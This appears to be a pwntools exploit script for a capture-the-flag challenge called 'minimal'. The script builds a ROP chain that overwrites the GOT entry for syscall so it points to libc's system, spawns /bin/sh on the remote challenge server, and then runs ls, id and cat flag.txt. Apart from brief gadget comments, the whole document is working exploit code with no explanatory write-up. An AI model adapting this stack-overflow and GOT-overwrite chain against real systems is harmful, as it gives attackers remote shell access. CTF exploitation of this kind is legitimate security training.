from pwn import *
import time

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#context.log_level = 'debug'
#gdb.attach(conn, gdbscript="break system")

# 0x00000000001272e7 : pop rdi ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret

# mov rdi, rbp-0x8; read

out = []

gadget = 0x401142

payload = b'a'*0x8
payload += p64(elf.bss())
payload += p64(gadget)
out.append(payload + b"\n")

payload = p64(elf.got.syscall-0x10)
payload += p64(gadget)

add = 0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret

current = 0x1272e7
target = libc.sym.system

final = b''
final += p64(0x40101a)*5
final += p64(elf.sym.syscall) # pop rdi; junk junk junk junk; pop rbx; pop rbp; pop r12
final += p64(0x404898) # /bin/sh
final += p64(1)
final += p64(2)
final += p64(3)
final += p64(4)
final += p64(target-current, signed=True)
final += p64(elf.got.syscall + 0x3d)
final += p64(5)
final += p64(add)
final += p64(0x40101a)*251 # shift the stack down
final += p64(elf.sym.syscall) # gadget
final += b'/bin/sh\0'
out.append(b'a'*0x8 + payload + final + b"\n")
out.append(b"a"*0x10 + p64(elf.sym.syscall) + b'\xe7\xc2')
out.append(b"ls\n")
out.append(b"id\n")
out.append(b"cat flag.txt\n")

while True:
#  conn = process(["python3", "run.py"])
#  conn.sendlineafter(b":", str(len(out)).encode())
#  conn = process("./run.sh")
  conn = remote("minimal.chal.imaginaryctf.org", 42043)
#  conn = remote("localhost", 62280)
  try:
    for line in out:
      time.sleep(0.1)
#      conn.sendline(line.hex())
      conn.send(line)
    conn.stream()
  except:
    pass
